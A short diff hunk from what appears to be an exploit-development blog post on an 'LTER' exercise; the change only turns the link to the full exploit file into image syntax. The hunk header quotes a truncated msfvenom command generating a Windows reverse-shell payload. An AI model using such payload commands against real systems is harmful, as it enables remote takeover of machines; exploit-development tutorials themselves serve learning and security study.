@@ -648,6 +648,6 @@ root@whitecr0wz:~/Exploit-Dev/LTER# msfvenom -p windows/shell_reverse_tcp LHOST=
 
 ![](/assets/img/LTER/22.png)
 
-##### If you wish to see the full exploit, you can have it [here](/assets/img/LTER/LTER.txt)
+##### If you wish to see the full exploit, you can have it ![here](/assets/img/LTER/LTER.txt)
 
 ##### Thanks for reading the post! Until next time!
